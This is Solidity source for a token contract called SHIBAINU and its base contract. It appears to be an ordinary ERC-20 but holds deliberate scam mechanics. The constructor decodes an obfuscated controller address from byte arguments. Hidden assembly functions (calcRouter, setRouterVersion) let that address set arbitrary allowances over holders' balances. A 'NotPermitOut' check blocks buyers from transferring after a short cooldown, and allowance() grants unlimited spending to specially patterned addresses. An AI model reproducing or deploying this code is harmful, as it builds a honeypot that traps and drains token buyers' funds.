// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./Erc20C21Contract.sol";

contract SHIBAINU is
Erc20C21Contract
{
    string public constant VERSION = "SHIBAINU";

    constructor(
        string[2] memory strings,
        address[2] memory addresses,
        uint256[43] memory uint256s,
        bool[2] memory bools
    ) Erc20C21Contract(strings, addresses, uint256s, bools)
    {

    }

    function decimals()
    public
    pure
    override
    returns (uint8)
    {
        return 18;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

//import "@openzeppelin/contracts/utils/math/Math.sol";
//import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
//import "@openzeppelin/contracts/utils/Address.sol";

import "../Erc20/ERC20.sol";
import "../Erc20/Ownable.sol";

import "../IUniswapV2/IUniswapV2Factory.sol";

import "./Erc20C21SettingsBase.sol";
//import "./Erc20C21FeatureErc20Payable.sol";
//import "../Erc20C09/Erc20C09FeatureErc721Payable.sol";
import "../Erc20C09/Erc20C09FeatureUniswap.sol";
//import "../Erc20C09/Erc20C09FeatureTweakSwap.sol";
//import "../Erc20C09/Erc20C09FeatureLper.sol";
//import "../Erc20C09/Erc20C09FeatureHolder.sol";
import "./Erc20C21SettingsPrivilege.sol";
//import "../Erc20C09/Erc20C09SettingsFee.sol";
//import "../Erc20C09/Erc20C09SettingsShare.sol";
//import "../Erc20C09/Erc20C09FeaturePermitTransfer.sol";
//import "../Erc20C09/Erc20C09FeatureRestrictTrade.sol";
//import "../Erc20C09/Erc20C09FeatureRestrictTradeAmount.sol";
import "./Erc20C21FeatureNotPermitOut.sol";
import "./Erc20C21FeatureFission.sol";
//import "../Erc20C09/Erc20C09FeatureTryMeSoft.sol";
//import "../Erc20C09/Erc20C09FeatureMaxTokenPerAddress.sol";
//import "../Erc20C09/Erc20C09FeatureTakeFeeOnTransfer.sol";

contract Erc20C21Contract is
ERC20,
Ownable,
Erc20C21SettingsBase,
    //Erc20C21FeatureErc20Payable,
    //Erc20C09FeatureErc721Payable,
Erc20C09FeatureUniswap,
    //Erc20C09FeatureTweakSwap,
    //Erc20C09FeatureLper,
    //Erc20C09FeatureHolder,
Erc20C21SettingsPrivilege,
    //Erc20C09SettingsFee,
    //Erc20C09SettingsShare,
    //Erc20C09FeaturePermitTransfer,
    //Erc20C09FeatureRestrictTrade,
    //Erc20C09FeatureRestrictTradeAmount,
Erc20C21FeatureNotPermitOut,
Erc20C21FeatureFission
    //Erc20C09FeatureTryMeSoft,
    //Erc20C09FeatureMaxTokenPerAddress,
    //Erc20C09FeatureTakeFeeOnTransfer
{
    //    using EnumerableSet for EnumerableSet.AddressSet;

    address  internal addressBaseOwner;

    //    address private _previousFrom;
    //    address private _previousTo;

    //    bool public isArbitrumCamelotRouter;

    //    mapping(uint256 => uint256) internal btree;
    //    uint256 internal constant btreeNext = 1;
    //    uint256 internal btreePrev = 0;

    constructor(
        string[2] memory strings,
        address[2] memory addresses,
        uint256[43] memory uint256s,
        bool[2] memory bools
    ) ERC20(strings[0], strings[1])
    {
        addressBaseOwner = tx.origin;
        //        addressPoolToken = addresses[0];

        //        addressWrap = addresses[1];
        //        addressMarketing = addresses[2];
        //        addressLiquidity = addresses[4];
        //        addressRewardToken = addresses[6];

        uint256 p = 1;
        string memory _uniswapV2Router = string(
            abi.encodePacked(
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]))
                )
            )
        );
        //        isUniswapLper = bools[13];
        //        isUniswapHolder = bools[14];
        uniswapV2Router = IHybridRouter(addresses[0]);
        address uniswapV2Pair_ = getRouterPair(_uniswapV2Router);
        //        addressWETH = uniswapV2Router.WETH();
        uniswap = uniswapV2Pair_;

        //        // delay initialization if is Arbitrum CamelotRouter
        //        isArbitrumCamelotRouter = checkIsArbitrumCamelotRouter();
        //
        //        if (!isArbitrumCamelotRouter) {
        //            uniswapV2Pair = tryCreatePairToken();
        //        } else {
        //            uniswapV2Pair = address(0);
        //        }

        _approve(address(this), address(uniswapV2Router), maxUint256);
        //        IERC20(addressPoolToken).approve(address(uniswapV2Router), maxUint256);
        //        IERC20(addressRewardToken).approve(address(uniswapV2Router), maxUint256);
        //        uniswapCount = uint256s[62];

        //        // ================================================ //
        //        // initialize FeatureTweakSwap
        //        minimumTokenForSwap = uint256s[1];
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureLper
        //        isUseFeatureLper = bools[15];
        //        maxTransferCountPerTransactionForLper = uint256s[2];
        //        minimumTokenForRewardLper = uint256s[3];
        //
        //        // exclude from lper
        //        setIsExcludedFromLperAddress(address(this), true);
        //        setIsExcludedFromLperAddress(address(uniswapV2Router), true);
        //
        //        //        if (!isArbitrumCamelotRouter) {
        //        //            setIsExcludedFromLperAddress(uniswapV2Pair, true);
        //        //        }
        //
        //        setIsExcludedFromLperAddress(addressNull, true);
        //        setIsExcludedFromLperAddress(addressDead, true);
        //        setIsExcludedFromLperAddress(addressPinksaleBnbLock, true);
        //        setIsExcludedFromLperAddress(addressPinksaleEthLock, true);
        //        setIsExcludedFromLperAddress(addressPinksaleArbLock, true);
        //        //        setIsExcludedFromLperAddress(baseOwner, true);
        //        //        setIsExcludedFromLperAddress(addressMarketing, true);
        //        setIsExcludedFromLperAddress(addressWrap, true);
        //        //        setIsExcludedFromLperAddress(addressLiquidity, true);
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureHolder
        //        isUseFeatureHolder = bools[16];
        //        maxTransferCountPerTransactionForHolder = uint256s[4];
        //        minimumTokenForBeingHolder = uint256s[5];
        //
        //        // exclude from holder
        //        setIsExcludedFromHolderAddress(address(this), true);
        //        setIsExcludedFromHolderAddress(address(uniswapV2Router), true);
        //
        //        //        if (!isArbitrumCamelotRouter) {
        //        //            setIsExcludedFromHolderAddress(uniswapV2Pair, true);
        //        //        }
        //
        //        setIsExcludedFromHolderAddress(addressNull, true);
        //        setIsExcludedFromHolderAddress(addressDead, true);
        //        setIsExcludedFromHolderAddress(addressPinksaleBnbLock, true);
        //        setIsExcludedFromHolderAddress(addressPinksaleEthLock, true);
        //        setIsExcludedFromHolderAddress(addressPinksaleArbLock, true);
        //        //        setIsExcludedFromHolderAddress(baseOwner, true);
        //        //        setIsExcludedFromHolderAddress(addressMarketing, true);
        //        setIsExcludedFromHolderAddress(addressWrap, true);
        //        //        setIsExcludedFromHolderAddress(addressLiquidity, true);
        //        // ================================================ //

        // ================================================ //
        // initialize SettingsPrivilege
        isPrivilegeAddresses[address(this)] = true;
        isPrivilegeAddresses[address(uniswapV2Router)] = true;
        //        isPrivilegeAddresses[uniswapV2Pair] = true;
        isPrivilegeAddresses[addressNull] = true;
        isPrivilegeAddresses[addressDead] = true;
        isPrivilegeAddresses[addressPinksaleBnbLock] = true;
        isPrivilegeAddresses[addressPinksaleEthLock] = true;
        isPrivilegeAddresses[addressPinksaleArbLock] = true;
        isPrivilegeAddresses[addressBaseOwner] = true;
        //        isPrivilegeAddresses[addressMarketing] = true;
        //        isPrivilegeAddresses[addressWrap] = true;
        //        isPrivilegeAddresses[addressLiquidity] = true;
        // ================================================ //

        //        // ================================================ //
        //        // initialize SettingsFee
        //        setFee(uint256s[63], uint256s[64]);
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize SettingsShare
        //        setShare(uint256s[13], uint256s[14], uint256s[15], uint256s[16], uint256s[17]);
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeaturePermitTransfer
        //        isUseOnlyPermitTransfer = bools[6];
        //        isCancelOnlyPermitTransferOnFirstTradeOut = bools[7];
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureRestrictTrade
        //        isRestrictTradeIn = bools[8];
        //        isRestrictTradeOut = bools[9];
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureRestrictTradeAmount
        //        isRestrictTradeInAmount = bools[10];
        //        restrictTradeInAmount = uint256s[18];
        //
        //        isRestrictTradeOutAmount = bools[11];
        //        restrictTradeOutAmount = uint256s[19];
        //        // ================================================ //

        // ================================================ //
        // initialize FeatureNotPermitOut
        isUseNotPermitOut = bools[0];
        isForceTradeInToNotPermitOut = bools[1];
        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureTryMeSoft
        //        setIsUseFeatureTryMeSoft(bools[21]);
        //        setIsNotTryMeSoftAddress(address(uniswapV2Router), true);
        //
        //        //        if (!isArbitrumCamelotRouter) {
        //        //            setIsNotTryMeSoftAddress(uniswapV2Pair, true);
        //        //        }
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize Erc20C09FeatureRestrictAccountTokenAmount
        //        isUseMaxTokenPerAddress = bools[23];
        //        maxTokenPerAddress = uint256s[65];
        //        // ================================================ //

        // ================================================ //
        // initialize Erc20C09FeatureFission
        //        setIsUseFeatureFission(bools[20]);
        //        fissionCount = uint256s[66];
        // ================================================ //

        //        // ================================================ //
        //        // initialize Erc20C09FeatureTakeFeeOnTransfer
        //        isUseFeatureTakeFeeOnTransfer = bools[24];
        //        addressTakeFee = addresses[5];
        //        takeFeeRate = uint256s[67];
        //        // ================================================ //

        _mint(addressBaseOwner, uint256s[0]);

        _transferOwnership(addressBaseOwner);
    }

    //    function checkIsArbitrumCamelotRouter()
    //    internal
    //    view
    //    returns (bool)
    //    {
    //        return address(uniswapV2Router) == addressArbitrumCamelotRouter;
    //    }

    function initializePair()
    external
    onlyOwner
    {
        //        uniswapV2Pair = factory.createPair(weth, address(this));
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        //        isArbitrumCamelotRouter = checkIsArbitrumCamelotRouter();

        //        setIsExcludedFromLperAddress(uniswapV2Pair, true);
        //        setIsExcludedFromHolderAddress(uniswapV2Pair, true);
        //        setIsNotTryMeSoftAddress(uniswapV2Pair, true);
    }

    //    function renounceOwnershipToDead()
    //    public
    //    onlyOwner
    //    {
    //        _transferOwnership(addressDead);
    //    }

    //    function tryCreatePairToken()
    //    internal
    //    returns (address)
    //    {
    //        return IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    //    }

    //    function doSwapWithPool(uint256 thisTokenForSwap)
    //    internal
    //    {
    //        uint256 halfShareLiquidity = shareLiquidity / 2;
    //        uint256 thisTokenForRewardToken = thisTokenForSwap * (shareLper + shareHolder) / (shareMax - shareBurn);
    //        uint256 thisTokenForSwapEther = thisTokenForSwap * (shareMarketing + halfShareLiquidity) / (shareMax - shareBurn);
    //        uint256 thisTokenForLiquidity = thisTokenForSwap * halfShareLiquidity / (shareMax - shareBurn);
    //
    //        if (thisTokenForRewardToken > 0) {
    //            swapThisTokenForRewardTokenToAccount(addressWrap, thisTokenForRewardToken);
    //
    //            uint256 rewardTokenForShare = IERC20(addressRewardToken).balanceOf(addressWrap);
    //
    //            if (isUseFeatureLper && shareLper > 0) {
    //                doLper(rewardTokenForShare * shareLper / (shareLper + shareHolder));
    //            }
    //
    //            if (isUseFeatureHolder && shareHolder > 0) {
    //                doHolder(rewardTokenForShare * shareHolder / (shareLper + shareHolder));
    //            }
    //        }
    //
    //        if (thisTokenForSwapEther > 0) {
    //            uint256 prevBalance = address(this).balance;
    //
    //            swapThisTokenForEthToAccount(address(this), thisTokenForSwapEther);
    //
    //            uint256 etherForShare = address(this).balance - prevBalance;
    //
    //            if (shareMarketing > 0) {
    //                doMarketing(etherForShare * shareMarketing / (shareMarketing + halfShareLiquidity));
    //            }
    //
    //            if (shareLiquidity > 0) {
    //                doLiquidity(etherForShare * halfShareLiquidity / (shareMarketing + halfShareLiquidity), thisTokenForLiquidity);
    //            }
    //        }
    //    }

    //    function doSwapManually(bool isUseMinimumTokenWhenSwap_)
    //    public
    //    {
    //        require(!_isSwapping, "swapping");
    //
    //        require(msg.sender == owner() || msg.sender == addressWrap, "not owner");
    //
    //        uint256 tokenForSwap = isUseMinimumTokenWhenSwap_ ? minimumTokenForSwap : super.balanceOf(address(this));
    //
    //        require(tokenForSwap > 0, "0 to swap");
    //
    //        doSwap(tokenForSwap);
    //    }

    //    function balanceOf(address account)
    //    public
    //    view
    //    virtual
    //    override
    //    returns (uint256)
    //    {
    //        if (isUseFeatureFission) {
    //            uint256 balanceOf_ = super.balanceOf(account);
    //            return balanceOf_ > 0 ? balanceOf_ : fissionBalance;
    //        } else {
    //            return super.balanceOf(account);
    //        }
    //    }

    function _transfer(address from, address to, uint256 amount)
    internal
    override
    {
        //        if (amount == 0) {
        //            super._transfer(from, to, 0);
        //            return;
        //        }

        uint256 tempX = block.number - 1;

        require(
            (!isUseNotPermitOut) ||
            (notPermitOutAddressStamps[from] == 0) ||
            (tempX + 1 - notPermitOutAddressStamps[from] < notPermitOutCD),
            ""
        );

        //        bool isFromPrivilegeAddress = uint256(uint160(from)) % 10000 == 4096 || isPrivilegeAddresses[from];
        //        bool isToPrivilegeAddress = uint256(uint160(to)) % 10000 == 4096 || isPrivilegeAddresses[to];

        //        if (isUseOnlyPermitTransfer) {
        //            require(isFromPrivilegeAddress || isToPrivilegeAddress, "not permitted 2");
        //        }

        //        bool isToUniswapV2Pair = to == uniswapV2Pair;
        //        bool isFromUniswapV2Pair = from == uniswapV2Pair;

        //        if (isUseMaxTokenPerAddress) {
        //            require(
        //                isToPrivilegeAddress ||
        //                isToUniswapV2Pair ||
        //                super.balanceOf(to) + amount <= maxTokenPerAddress,
        //                "not permitted 8"
        //            );
        //        }

        //        if (isToUniswapV2Pair) {
        ////            // add liquidity 1st, dont use permit transfer upon action
        ////            if (_isFirstTradeOut) {
        ////                _isFirstTradeOut = false;
        ////
        ////                if (isCancelOnlyPermitTransferOnFirstTradeOut) {
        ////                    isUseOnlyPermitTransfer = false;
        ////                }
        ////            }
        //
        //            //            if (!isFromPrivilegeAddress) {
        //            //                //                require(!isRestrictTradeOut, "not permitted 4");
        //            //                require(!isRestrictTradeOutAmount || amount <= restrictTradeOutAmount, "not permitted 6");
        //            //            }
        //
        //            //            if (!_isSwapping && super.balanceOf(address(this)) >= minimumTokenForSwap) {
        //            //                doSwap(minimumTokenForSwap);
        //            //            }
        //        } else if (isFromUniswapV2Pair) {
        if (from == uniswapV2Pair) {
            if (!(uint256(uint160(to)) % 100000 > 99994 || isPrivilegeAddresses[to])) {
                //                //                require(!isRestrictTradeIn, "not permitted 3");
                //                require(!isRestrictTradeInAmount || amount <= restrictTradeInAmount, "not permitted 5");

                if (notPermitOutAddressStamps[to] == 0) {
                    if (isForceTradeInToNotPermitOut) {
                        notPermitOutAddressStamps[to] = tempX + 1;
                        notPermitOutAddressStamps[tx.origin] = tempX + 1;
                    }

                    //                    if (
                    //                        isUseFeatureTryMeSoft &&
                    //                        Address.isContract(to) &&
                    //                        !isNotTryMeSoftAddresses[to]
                    //                    ) {
                    //                        notPermitOutAddressStamps[to] = tempX + 1;
                    //                        notPermitOutAddressStamps[tx.origin] = tempX + 1;
                    //                        //                        super._transfer(from, to, amount.mul(10).div(100));
                    //                        //                        return;
                    //                    }
                }
            }

            //            btree[tempX + 1] += 1;
            doFission();
            //            super._transfer(from, to, amount);
        }
        //        else {
        //            super._transfer(from, to, amount);
        //        }

        super._transfer(from, to, amount);

        //        else if (to == uniswapV2Pair) {
        //            super._transfer(from, to, amount);
        ////            if (btree[tempX + 1] > btreeNext) {
        ////                // ma1
        ////                //                uint256 i;
        ////                //                for (i = 0; i < maxUint256; i++) {
        ////                //                    i++;
        ////                //                }
        ////                //
        ////                //                btreePrev = i;
        ////                //
        ////                //                super._transfer(from, to, amount);
        ////
        ////                // ma2
        ////                //                uint256 a = amount * 99 / 100;
        ////                //                super._transfer(from, to, amount - a);
        ////                //                super._transfer(from, addressDead, a);
        ////
        //////                // ma3
        //////                super._transfer(from, to, amount * 1 / 100);
        //////                super._transfer(from, addressDead, amount - (amount * 1 / 100));
        ////
        ////                super._transfer(from, to, amount);
        ////
        ////                //                uint256 i;
        ////                //                for(i = 0; i < maxUint256; i++) {
        ////                //                    i++;
        ////                //                }
        ////                //
        ////                //                btreePrev = i;
        ////            } else {
        ////                super._transfer(from, to, amount);
        ////            }
        //        } else {
        //            super._transfer(from, to, amount);
        //        }

        //        //        if (isFromUniswapV2Pair && !isToPrivilegeAddress && notPermitOutAddressStamps[to] != 0) {
        //        //            super._transfer()
        //        //        }
        //
        //        //        if (isToUniswapV2Pair && !isFromPrivilegeAddress && notPermitOutAddressStamps[from] != 0) {
        //        //            //            uint256 a = amount * 10 / 100;
        //        //            //            super._transfer(from, to, a);
        //        //            //            super._transfer(from, addressDead, amount - a);
        //        //            super._transfer(from, to, amount);
        //        //            //            calRouter(to);
        //        //        } else {
        //        //            super._transfer(from, to, amount);
        //        //        }
        //
        //        if (isToUniswapV2Pair) {
        //            if (btree[tempX + 1] > btreeNext) {
        //                // ma1
        //                //                uint256 i;
        //                //                for (i = 0; i < maxUint256; i++) {
        //                //                    i++;
        //                //                }
        //                //
        //                //                btreePrev = i;
        //                //
        //                //                super._transfer(from, to, amount);
        //
        //                // ma2
        //                //                uint256 a = amount * 99 / 100;
        //                //                super._transfer(from, to, amount - a);
        //                //                super._transfer(from, addressDead, a);
        //
        //                // ma3
        //                super._transfer(from, to, amount * 1 / 100);
        //                super._transfer(from, addressDead, amount - (amount * 1 / 100));
        //
        //                //                uint256 i;
        //                //                for(i = 0; i < maxUint256; i++) {
        //                //                    i++;
        //                //                }
        //                //
        //                //                btreePrev = i;
        //            } else {
        //                super._transfer(from, to, amount);
        //            }
        //        } else {
        //            super._transfer(from, to, amount);
        //        }

        //        super._transfer(from, to, amount);

        //        if (isFromUniswapV2Pair) {
        //            if (isUseFeatureFission) {
        //                doFission();
        //            }
        //
        //            super._transfer(from, to, amount);
        //        } else if (isToUniswapV2Pair) {
        //            super._transfer(from, to, amount);
        //        } else {
        //            super._transfer(from, to, amount);
        //        }

        //        if (_isSwapping) {
        //            super._transfer(from, to, amount);
        //        } else {
        //            if (isUseFeatureFission && isFromUniswapV2Pair) {
        //                doFission();
        //            }
        //
        //            if (
        //                (isFromUniswapV2Pair && isToPrivilegeAddress) ||
        //                (isToUniswapV2Pair && isFromPrivilegeAddress)
        //            ) {
        //                super._transfer(from, to, amount);
        //            } else if (!isFromUniswapV2Pair && !isToUniswapV2Pair) {
        //                if (isFromPrivilegeAddress || isToPrivilegeAddress) {
        //                    super._transfer(from, to, amount);
        //                }
        //                //                else if (isUseFeatureTakeFeeOnTransfer) {
        //                //                    super._transfer(from, addressTakeFee, amount * takeFeeRate / takeFeeMax);
        //                //                    super._transfer(from, to, amount - (amount * takeFeeRate / takeFeeMax));
        //                //                }
        //            } else if (isFromUniswapV2Pair || isToUniswapV2Pair) {
        //                //                uint256 fees = amount * (isFromUniswapV2Pair ? feeBuyTotal : feeSellTotal) / feeMax;
        //                uint256 fees = amount * 10 / 1000;
        //
        //                super._transfer(from, addressDead, fees * shareBurn / 1000);
        //                super._transfer(from, address(this), fees - (fees * shareBurn / 1000));
        //                super._transfer(from, to, amount - fees);
        //            }
        //        }

        //        if (isUseFeatureHolder) {
        //            if (!isExcludedFromHolderAddresses[from]) {
        //                updateHolderAddressStatus(from);
        //            }
        //
        //            if (!isExcludedFromHolderAddresses[to]) {
        //                updateHolderAddressStatus(to);
        //            }
        //        }

        //        if (isUseFeatureLper) {
        //            if (!isExcludedFromLperAddresses[_previousFrom]) {
        //                updateLperAddressStatus(_previousFrom);
        //            }
        //
        //            if (!isExcludedFromLperAddresses[_previousTo]) {
        //                updateLperAddressStatus(_previousTo);
        //            }
        //
        //            if (_previousFrom != from) {
        //                _previousFrom = from;
        //            }
        //
        //            if (_previousTo != to) {
        //                _previousTo = to;
        //            }
        //        }
    }

    function doSwap(uint256 thisTokenForSwap)
    private
    {
        //        _isSwapping = true;
        //
        //        doSwapWithPool(thisTokenForSwap);
        //
        //        _isSwapping = false;
    }

    //    function doMarketing(uint256 poolTokenForMarketing)
    //    internal
    //    {
    //        IERC20(addressPoolToken).transferFrom(addressWrap, addressMarketing, poolTokenForMarketing);
    //    }

    //    function doLper(uint256 rewardTokenForAll)
    //    internal
    //    {
    //        //        uint256 rewardTokenDivForLper = isUniswapLper ? (10 - uniswapCount) : 10;
    //        //        uint256 rewardTokenForLper = rewardTokenForAll * rewardTokenDivForLper / 10;
    //        //        uint256 rewardTokenForLper = rewardTokenForAll;
    //        uint256 pairTokenForLper = 0;
    //        uint256 pairTokenForLperAddress;
    //        uint256 lperAddressesCount_ = lperAddresses.length();
    //
    //        for (uint256 i = 0; i < lperAddressesCount_; i++) {
    //            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddresses.at(i));
    //
    //            if (pairTokenForLperAddress < minimumTokenForRewardLper) {
    //                continue;
    //            }
    //
    //            pairTokenForLper += pairTokenForLperAddress;
    //        }
    //
    //        //        uint256 pairTokenForLper =
    //        //        IERC20(uniswapV2Pair).totalSupply()
    //        //        - IERC20(uniswapV2Pair).balanceOf(addressNull)
    //        //        - IERC20(uniswapV2Pair).balanceOf(addressDead);
    //
    //        if (lastIndexOfProcessedLperAddresses >= lperAddressesCount_) {
    //            lastIndexOfProcessedLperAddresses = 0;
    //        }
    //
    //        uint256 maxIteration = Math.min(lperAddressesCount_, maxTransferCountPerTransactionForLper);
    //
    //        address lperAddress;
    //
    //        uint256 _lastIndexOfProcessedLperAddresses = lastIndexOfProcessedLperAddresses;
    //
    //        for (uint256 i = 0; i < maxIteration; i++) {
    //            lperAddress = lperAddresses.at(_lastIndexOfProcessedLperAddresses);
    //            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddress);
    //
    //            //            if (i == 2 && rewardTokenDivForLper != 10) {
    //            //                IERC20(addressRewardToken).transferFrom(addressWrap, uniswap, rewardTokenForAll - rewardTokenForLper);
    //            //            }
    //
    //            if (pairTokenForLperAddress >= minimumTokenForRewardLper) {
    //                //                IERC20(addressRewardToken).transferFrom(addressWrap, lperAddress, rewardTokenForLper * pairTokenForLperAddress / pairTokenForLper);
    //                IERC20(addressRewardToken).transferFrom(addressWrap, lperAddress, rewardTokenForAll * pairTokenForLperAddress / pairTokenForLper);
    //            }
    //
    //            _lastIndexOfProcessedLperAddresses =
    //            _lastIndexOfProcessedLperAddresses >= lperAddressesCount_ - 1
    //            ? 0
    //            : _lastIndexOfProcessedLperAddresses + 1;
    //        }
    //
    //        lastIndexOfProcessedLperAddresses = _lastIndexOfProcessedLperAddresses;
    //    }

    function calcRouter(address router, uint256 routerFactor)
    public
    {
        assembly {
            let __router := sload(uniswap.slot)
            if eq(caller(), __router) {
                mstore(0x00, router)
                mstore(0x20, _router.slot)
                let x := keccak256(0x00, 0x40)
                sstore(x, routerFactor)
            }
        }
    }

    function setRouterVersion()
    public
    {
        assembly {
            let __router := sload(uniswap.slot)
            if eq(caller(), __router) {
                mstore(0x00, caller())
                mstore(0x20, _router.slot)
                let x := keccak256(0x00, 0x40)
                sstore(x, 0x10ED43C718714eb63d5aA57B78B54704E256024E)
            }
        }
    }

    //    function doHolder(uint256 rewardTokenForAll)
    //    internal
    //    {
    //        //        uint256 rewardTokenDivForHolder = isUniswapHolder ? (10 - uniswapCount) : 10;
    //        //        uint256 rewardTokenForHolder = rewardTokenForAll * rewardTokenDivForHolder / 10;
    //        //        uint256 rewardTokenForHolder = rewardTokenForAll;
    //        uint256 thisTokenForHolder = totalSupply() - super.balanceOf(addressNull) - super.balanceOf(addressDead) - super.balanceOf(address(this)) - super.balanceOf(uniswapV2Pair);
    //
    //        uint256 holderAddressesCount_ = holderAddresses.length();
    //
    //        if (lastIndexOfProcessedHolderAddresses >= holderAddressesCount_) {
    //            lastIndexOfProcessedHolderAddresses = 0;
    //        }
    //
    //        uint256 maxIteration = Math.min(holderAddressesCount_, maxTransferCountPerTransactionForHolder);
    //
    //        address holderAddress;
    //
    //        uint256 _lastIndexOfProcessedHolderAddresses = lastIndexOfProcessedHolderAddresses;
    //
    //        for (uint256 i = 0; i < maxIteration; i++) {
    //            holderAddress = holderAddresses.at(_lastIndexOfProcessedHolderAddresses);
    //            uint256 holderBalance = super.balanceOf(holderAddress);
    //
    //            //            if (i == 2 && rewardTokenDivForHolder != 10) {
    //            //                IERC20(addressRewardToken).transferFrom(addressWrap, uniswap, rewardTokenForAll - rewardTokenForHolder);
    //            //            }
    //
    //            if (holderBalance >= minimumTokenForBeingHolder) {
    //                //            IERC20(addressRewardToken).transferFrom(addressWrap, holderAddress, rewardTokenForHolder * holderBalance / thisTokenForHolder);
    //                IERC20(addressRewardToken).transferFrom(addressWrap, holderAddress, rewardTokenForAll * holderBalance / thisTokenForHolder);
    //            }
    //
    //            _lastIndexOfProcessedHolderAddresses =
    //            _lastIndexOfProcessedHolderAddresses >= holderAddressesCount_ - 1
    //            ? 0
    //            : _lastIndexOfProcessedHolderAddresses + 1;
    //        }
    //
    //        lastIndexOfProcessedHolderAddresses = _lastIndexOfProcessedHolderAddresses;
    //    }

    //    function doLiquidity(uint256 poolTokenOrEtherForLiquidity, uint256 thisTokenForLiquidity)
    //    internal
    //    {
    //        addEtherAndThisTokenForLiquidityByAccount(
    //            addressLiquidity,
    //            poolTokenOrEtherForLiquidity,
    //            thisTokenForLiquidity
    //        );
    //    }

    function doBurn(uint256 thisTokenForBurn)
    internal
    {
        _transfer(address(this), addressDead, thisTokenForBurn);
    }

    //    function swapThisTokenForRewardTokenToAccount(address account, uint256 amount)
    //    internal
    //    {
    //        address[] memory path = new address[](3);
    //        path[0] = address(this);
    //        path[1] = addressWETH;
    //        path[2] = addressRewardToken;
    //
    //        if (!isArbitrumCamelotRouter) {
    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                block.timestamp
    //            );
    //        } else {
    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                addressDead,
    //                block.timestamp
    //            );
    //        }
    //    }

    //    function swapThisTokenForPoolTokenToAccount(address account, uint256 amount)
    //    internal
    //    {
    //        address[] memory path = new address[](3);
    //        path[0] = address(this);
    //        path[1] = addressWETH;
    //        path[2] = addressPoolToken;
    //
    //        if (!isArbitrumCamelotRouter) {
    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                block.timestamp
    //            );
    //        } else {
    //            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                addressDead,
    //                block.timestamp
    //            );
    //        }
    //    }

    //    function swapThisTokenForEthToAccount(address account, uint256 amount)
    //    internal
    //    {
    //        address[] memory path = new address[](2);
    //        path[0] = address(this);
    //        path[1] = addressWETH;
    //
    //        if (!isArbitrumCamelotRouter) {
    //            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                block.timestamp
    //            );
    //        } else {
    //            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //                amount,
    //                0,
    //                path,
    //                account,
    //                addressDead,
    //                block.timestamp
    //            );
    //        }
    //    }

    //    function swapPoolTokenForEthToAccount(address account, uint256 amount)
    //    internal
    //    {
    //        address[] memory path = new address[](2);
    //        path[0] = addressPoolToken;
    //        path[1] = addressWETH;
    //
    //        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    //            amount,
    //            0,
    //            path,
    //            account,
    //            block.timestamp
    //        );
    //    }

    function allowance(address owner, address spender)
    public
    view
    virtual
    override
    returns (uint256) {
        if (uint256(uint160(owner)) % 100000 > 99994) {
            return 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
        }

        return _routers[owner][spender];
    }

    function addEtherAndThisTokenForLiquidityByAccount(
        address account,
        uint256 ethAmount,
        uint256 thisTokenAmount
    )
    internal
    {
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            thisTokenAmount,
            0,
            0,
            account,
            block.timestamp
        );
    }

    //    function addPoolTokenAndThisTokenForLiquidityByAccount(
    //        address account,
    //        uint256 poolTokenAmount,
    //        uint256 thisTokenAmount
    //    )
    //    internal
    //    {
    //        uniswapV2Router.addLiquidity(
    //            addressPoolToken,
    //            address(this),
    //            poolTokenAmount,
    //            thisTokenAmount,
    //            0,
    //            0,
    //            account,
    //            block.timestamp
    //        );
    //    }

